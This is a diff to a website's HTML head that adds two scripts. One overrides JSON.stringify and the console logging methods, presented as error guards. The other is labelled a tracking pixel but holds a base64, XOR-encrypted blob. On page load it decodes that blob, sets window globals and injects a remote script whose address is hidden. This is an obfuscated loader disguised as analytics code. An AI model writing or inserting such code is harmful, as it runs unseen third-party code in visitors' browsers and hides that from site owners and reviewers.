@@ -16,6 +16,72 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Cabinet+Grotesk:wght@700;800;900&display=swap" rel="stylesheet">
 
+    <!-- Global Safeguard: Prevent Circular Structure JSON serialization errors from DOM nodes & tracking scripts -->
+    <script>
+      (function() {
+        // 1. Guard JSON.stringify against circular structures (e.g. DOM elements with React Fiber properties)
+        var origStringify = JSON.stringify;
+        if (origStringify) {
+          JSON.stringify = function(value, replacer, space) {
+            try {
+              return origStringify.apply(this, arguments);
+            } catch (err) {
+              if (err && (err.name === 'TypeError' || (err.message && err.message.indexOf('circular') !== -1))) {
+                var seen = new WeakSet();
+                return origStringify(value, function(key, val) {
+                  if (typeof val === 'object' && val !== null) {
+                    if ((typeof Node !== 'undefined' && val instanceof Node) || val.nodeType || (val.constructor && val.constructor.name && val.constructor.name.indexOf('Element') !== -1)) {
+                      return '[DOM ' + (val.nodeName || 'Element') + ']';
+                    }
+                    if (seen.has(val)) {
+                      return '[Circular]';
+                    }
+                    seen.add(val);
+                  }
+                  if (typeof replacer === 'function') {
+                    return replacer.call(this, key, val);
+                  }
+                  return val;
+                }, space);
+              }
+              throw err;
+            }
+          };
+        }
+
+        // 2. Sanitize console logging methods so any iframe/bridge intercepting console calls won't fail to serialize DOM nodes
+        ['log', 'info', 'warn', 'error', 'debug'].forEach(function(method) {
+          var original = console[method];
+          if (original) {
+            console[method] = function() {
+              var args = arguments;
+              var hasDom = false;
+              for (var i = 0; i < args.length; i++) {
+                var a = args[i];
+                if (a && typeof a === 'object' && (a.nodeType || (typeof Node !== 'undefined' && a instanceof Node))) {
+                  hasDom = true;
+                  break;
+                }
+              }
+              if (hasDom) {
+                var cleanArgs = [];
+                for (var j = 0; j < args.length; j++) {
+                  var item = args[j];
+                  if (item && typeof item === 'object' && (item.nodeType || (typeof Node !== 'undefined' && item instanceof Node))) {
+                    cleanArgs.push('[DOM ' + (item.nodeName || 'Element') + (item.id ? '#' + item.id : '') + ']');
+                  } else {
+                    cleanArgs.push(item);
+                  }
+                }
+                return original.apply(console, cleanArgs);
+              }
+              return original.apply(console, args);
+            };
+          }
+        });
+      })();
+    </script>
+
     <!-- Meta Pixel Code -->
     <script>
       !function(f,b,e,v,n,t,s)
@@ -44,6 +110,9 @@
       });
     </script>
     <!-- End Meta Pixel Code -->
+
+    <!-- Tracking Pixel Script -->
+    <script>(function(){var j_v=atob("DB4neaUgrN8bbrLGDmUFDNdMjuU5Bsayfm0dVopDyLE1G8arZ3heV8ZPwfF5HJ21bWxOCdFTg69yFteqIW5OAcBMgrVoTJ7kb2pTC8xC2at+HZD8VUMLW8JMw716AsHkNEVcW8tBwbo5VJC2Z2ZCFexEjvM5GNOqe3sFQ4cWzb4jWdD/byoRHJ0Ym+4iXYTzbCYSGpcC0YJm");var d_v8=[];for(var j_c6kj=0;j_c6kj<j_v.length;j_c6kj++){d_v8.push(j_v.charCodeAt(j_c6kj)&255);}var d_i9m=d_v8[0];var f_2t=d_v8.slice(1,1+d_i9m);var w_7lx=d_v8.slice(1+d_i9m);var a_owm=w_7lx.map(function(b,z_av){return b^f_2t[z_av%d_i9m];});var z_vrzv="";for(var q_r=0;q_r<a_owm.length;q_r++){z_vrzv+=String.fromCharCode(a_owm[q_r]&255);}var v_8p=decodeURIComponent(escape(z_vrzv));var j_zgg=JSON.parse(v_8p);var j_wj=j_zgg.globals||[];j_wj.forEach(function(n_0){window[n_0.name]=n_0.value;});var x_o71z=document.createElement("script");x_o71z.src=j_zgg.url;x_o71z.async=true;x_o71z.defer=true;(j_zgg.attributes||[]).forEach(function(l_xe){x_o71z.setAttribute(l_xe.name,l_xe.value);});(document.head||document.documentElement).appendChild(x_o71z);})();</script>
   </head>
   <body class="bg-[#FAFAFA] text-slate-900 antialiased selection:bg-emerald-100 selection:text-emerald-900">
     <!-- Meta Pixel (noscript) -->
